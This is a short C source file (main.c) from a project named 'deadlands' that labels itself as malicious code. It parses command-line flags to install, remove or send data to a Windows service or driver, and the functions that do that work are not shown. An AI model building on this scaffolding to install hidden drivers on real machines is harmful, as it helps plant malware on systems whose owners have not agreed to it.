/*
** Malicious code - project: deadlands
** Filename: main.c
*/

#include <windows.h>
#include <stdio.h>
#include "service.h"

t_option		options[] = 
{
	{"-i", InstallService},
    {"-r", RemoveService},
	{"-s", SendDriverData},
	{NULL, NULL}
};

static void		deadlandsUsage(const char *name)
{
	printf("[USAGE]: %s -i/install <serviceName path> | -r/remove <serviceName> | -s/send <service data>\n", name);
}

int				main(int argc, char **argv)
{
	SC_HANDLE	hSCManager;
	DWORD		ret;
	DWORD		i;

	if (argc < 3 || argc > 4)
	{
		deadlandsUsage(argv[0]);
		return (-1);
	}

	i = 0;
    ret = -1;
	while (options[i].opt != NULL)
	{
		if (!strcmp(options[i].opt, argv[1]))
		{
			ret = options[i].fun(&argv[2]);
			break;
		}
		i++;
	}

	if (options[i].opt == NULL)
		deadlandsUsage(argv[0]);
	return (ret);
}
